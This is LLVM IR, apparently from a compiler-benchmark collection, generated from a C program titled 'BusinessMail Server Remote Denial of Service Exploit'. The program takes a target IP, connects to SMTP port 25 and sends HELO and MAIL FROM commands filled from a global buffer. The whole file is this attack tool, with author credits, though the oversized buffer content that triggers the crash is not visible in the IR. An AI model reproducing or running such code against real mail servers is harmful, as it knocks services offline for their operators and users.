; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1126.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/windows/dos/extr_1126.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.sockaddr_in = type { i32, %struct.TYPE_2__, i32, i32 }
%struct.TYPE_2__ = type { i32 }
%struct.sockaddr = type { i32 }

@stdout = common dso_local global i32 0, align 4
@.str = private unnamed_addr constant [63 x i8] c"BusinessMail Server Remote Denial of Service Exploit by Kozan\0A\00", align 1
@.str.1 = private unnamed_addr constant [27 x i8] c"Discovered by: Reed Arvin\0A\00", align 1
@.str.2 = private unnamed_addr constant [25 x i8] c"Exploit Coded by: Kozan\0A\00", align 1
@.str.3 = private unnamed_addr constant [32 x i8] c"Credits to ATmaCA, Reed Arvin\0A\0A\00", align 1
@.str.4 = private unnamed_addr constant [51 x i8] c"www.spyinstructors.com - kozan@spyinstructors.com\0A\00", align 1
@stderr = common dso_local global i32 0, align 4
@.str.5 = private unnamed_addr constant [26 x i8] c"\0A\0AUsage: %s [Target IP]\0A\0A\00", align 1
@.str.6 = private unnamed_addr constant [16 x i8] c"Winsock error!\0A\00", align 1
@AF_INET = common dso_local global i32 0, align 4
@SOCK_STREAM = common dso_local global i32 0, align 4
@.str.7 = private unnamed_addr constant [15 x i8] c"Socket error!\0A\00", align 1
@.str.8 = private unnamed_addr constant [22 x i8] c"Connecting to %s ...\0A\00", align 1
@.str.9 = private unnamed_addr constant [20 x i8] c"Connection failed!\0A\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"Connected.\0A\00", align 1
@.str.11 = private unnamed_addr constant [10 x i8] c"HELO %s\0D\0A\00", align 1
@Buff = common dso_local global i32 0, align 4
@.str.12 = private unnamed_addr constant [15 x i8] c"MAIL FROM:%s\0D\0A\00", align 1
@.str.13 = private unnamed_addr constant [18 x i8] c"Sending HELO ...\0A\00", align 1
@.str.14 = private unnamed_addr constant [29 x i8] c"HELO string could not sent!\0A\00", align 1
@.str.15 = private unnamed_addr constant [23 x i8] c"Sending MAIL FROM ...\0A\00", align 1
@.str.16 = private unnamed_addr constant [34 x i8] c"MAIL FROM string could not sent!\0A\00", align 1
@.str.17 = private unnamed_addr constant [24 x i8] c"Operation completed...\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca %struct.sockaddr_in, align 4
  %9 = alloca [1024 x i8], align 16
  %10 = alloca [1024 x i8], align 16
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  %11 = load i32, i32* @stdout, align 4
  %12 = call i32 (i32, i8*, ...) @fprintf(i32 %11, i8* getelementptr inbounds ([63 x i8], [63 x i8]* @.str, i64 0, i64 0))
  %13 = load i32, i32* @stdout, align 4
  %14 = call i32 (i32, i8*, ...) @fprintf(i32 %13, i8* getelementptr inbounds ([27 x i8], [27 x i8]* @.str.1, i64 0, i64 0))
  %15 = load i32, i32* @stdout, align 4
  %16 = call i32 (i32, i8*, ...) @fprintf(i32 %15, i8* getelementptr inbounds ([25 x i8], [25 x i8]* @.str.2, i64 0, i64 0))
  %17 = load i32, i32* @stdout, align 4
  %18 = call i32 (i32, i8*, ...) @fprintf(i32 %17, i8* getelementptr inbounds ([32 x i8], [32 x i8]* @.str.3, i64 0, i64 0))
  %19 = load i32, i32* @stdout, align 4
  %20 = call i32 (i32, i8*, ...) @fprintf(i32 %19, i8* getelementptr inbounds ([51 x i8], [51 x i8]* @.str.4, i64 0, i64 0))
  %21 = load i32, i32* %4, align 4
  %22 = icmp slt i32 %21, 2
  br i1 %22, label %23, label %29

23:                                               ; preds = %2
  %24 = load i32, i32* @stderr, align 4
  %25 = load i8**, i8*** %5, align 8
  %26 = getelementptr inbounds i8*, i8** %25, i64 0
  %27 = load i8*, i8** %26, align 8
  %28 = call i32 (i32, i8*, ...) @fprintf(i32 %24, i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.5, i64 0, i64 0), i8* %27)
  store i32 -1, i32* %3, align 4
  br label %113

29:                                               ; preds = %2
  %30 = call i64 @WSAStartup(i32 257, i32* %6)
  %31 = icmp slt i64 %30, 0
  br i1 %31, label %32, label %35

32:                                               ; preds = %29
  %33 = load i32, i32* @stderr, align 4
  %34 = call i32 (i32, i8*, ...) @fprintf(i32 %33, i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.6, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %113

35:                                               ; preds = %29
  %36 = load i32, i32* @AF_INET, align 4
  %37 = load i32, i32* @SOCK_STREAM, align 4
  %38 = call i32 @socket(i32 %36, i32 %37, i32 0)
  store i32 %38, i32* %7, align 4
  %39 = load i32, i32* %7, align 4
  %40 = icmp eq i32 %39, -1
  br i1 %40, label %41, label %44

41:                                               ; preds = %35
  %42 = load i32, i32* @stderr, align 4
  %43 = call i32 (i32, i8*, ...) @fprintf(i32 %42, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.7, i64 0, i64 0))
  store i32 -1, i32* %3, align 4
  br label %113

44:                                               ; preds = %35
  %45 = load i32, i32* @AF_INET, align 4
  %46 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 3
  store i32 %45, i32* %46, align 4
  %47 = call i32 @htons(i32 25)
  %48 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 2
  store i32 %47, i32* %48, align 4
  %49 = load i8**, i8*** %5, align 8
  %50 = getelementptr inbounds i8*, i8** %49, i64 1
  %51 = load i8*, i8** %50, align 8
  %52 = call i32 @inet_addr(i8* %51)
  %53 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 1
  %54 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %53, i32 0, i32 0
  store i32 %52, i32* %54, align 4
  %55 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %8, i32 0, i32 0
  %56 = call i32 @memset(i32* %55, i8 signext 0, i32 8)
  %57 = load i32, i32* @stdout, align 4
  %58 = load i8**, i8*** %5, align 8
  %59 = getelementptr inbounds i8*, i8** %58, i64 1
  %60 = load i8*, i8** %59, align 8
  %61 = call i32 (i32, i8*, ...) @fprintf(i32 %57, i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.8, i64 0, i64 0), i8* %60)
  %62 = load i32, i32* %7, align 4
  %63 = bitcast %struct.sockaddr_in* %8 to %struct.sockaddr*
  %64 = call i32 @connect(i32 %62, %struct.sockaddr* %63, i32 4)
  %65 = icmp eq i32 %64, -1
  br i1 %65, label %66, label %71

66:                                               ; preds = %44
  %67 = load i32, i32* @stderr, align 4
  %68 = call i32 (i32, i8*, ...) @fprintf(i32 %67, i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.9, i64 0, i64 0))
  %69 = load i32, i32* %7, align 4
  %70 = call i32 @closesocket(i32 %69)
  store i32 -1, i32* %3, align 4
  br label %113

71:                                               ; preds = %44
  %72 = load i32, i32* @stdout, align 4
  %73 = call i32 (i32, i8*, ...) @fprintf(i32 %72, i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i64 0, i64 0))
  %74 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %75 = load i32, i32* @Buff, align 4
  %76 = call i32 @wsprintf(i8* %74, i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.11, i64 0, i64 0), i32 %75)
  %77 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %78 = load i32, i32* @Buff, align 4
  %79 = call i32 @wsprintf(i8* %77, i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.12, i64 0, i64 0), i32 %78)
  %80 = load i32, i32* @stdout, align 4
  %81 = call i32 (i32, i8*, ...) @fprintf(i32 %80, i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.13, i64 0, i64 0))
  %82 = load i32, i32* %7, align 4
  %83 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %84 = getelementptr inbounds [1024 x i8], [1024 x i8]* %9, i64 0, i64 0
  %85 = call i32 @strlen(i8* %84)
  %86 = call i32 @send(i32 %82, i8* %83, i32 %85, i32 0)
  %87 = icmp eq i32 %86, -1
  br i1 %87, label %88, label %93

88:                                               ; preds = %71
  %89 = load i32, i32* @stderr, align 4
  %90 = call i32 (i32, i8*, ...) @fprintf(i32 %89, i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.14, i64 0, i64 0))
  %91 = load i32, i32* %7, align 4
  %92 = call i32 @closesocket(i32 %91)
  store i32 -1, i32* %3, align 4
  br label %113

93:                                               ; preds = %71
  %94 = load i32, i32* @stdout, align 4
  %95 = call i32 (i32, i8*, ...) @fprintf(i32 %94, i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.15, i64 0, i64 0))
  %96 = load i32, i32* %7, align 4
  %97 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %98 = getelementptr inbounds [1024 x i8], [1024 x i8]* %10, i64 0, i64 0
  %99 = call i32 @strlen(i8* %98)
  %100 = call i32 @send(i32 %96, i8* %97, i32 %99, i32 0)
  %101 = icmp eq i32 %100, -1
  br i1 %101, label %102, label %107

102:                                              ; preds = %93
  %103 = load i32, i32* @stderr, align 4
  %104 = call i32 (i32, i8*, ...) @fprintf(i32 %103, i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.16, i64 0, i64 0))
  %105 = load i32, i32* %7, align 4
  %106 = call i32 @closesocket(i32 %105)
  store i32 -1, i32* %3, align 4
  br label %113

107:                                              ; preds = %93
  %108 = load i32, i32* @stdout, align 4
  %109 = call i32 (i32, i8*, ...) @fprintf(i32 %108, i8* getelementptr inbounds ([24 x i8], [24 x i8]* @.str.17, i64 0, i64 0))
  %110 = load i32, i32* %7, align 4
  %111 = call i32 @closesocket(i32 %110)
  %112 = call i32 (...) @WSACleanup()
  store i32 0, i32* %3, align 4
  br label %113

113:                                              ; preds = %107, %102, %88, %66, %41, %32, %23
  %114 = load i32, i32* %3, align 4
  ret i32 %114
}

declare dso_local i32 @fprintf(i32, i8*, ...) #1

declare dso_local i64 @WSAStartup(i32, i32*) #1

declare dso_local i32 @socket(i32, i32, i32) #1

declare dso_local i32 @htons(i32) #1

declare dso_local i32 @inet_addr(i8*) #1

declare dso_local i32 @memset(i32*, i8 signext, i32) #1

declare dso_local i32 @connect(i32, %struct.sockaddr*, i32) #1

declare dso_local i32 @closesocket(i32) #1

declare dso_local i32 @wsprintf(i8*, i8*, i32) #1

declare dso_local i32 @send(i32, i8*, i32, i32) #1

declare dso_local i32 @strlen(i8*) #1

declare dso_local i32 @WSACleanup(...) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
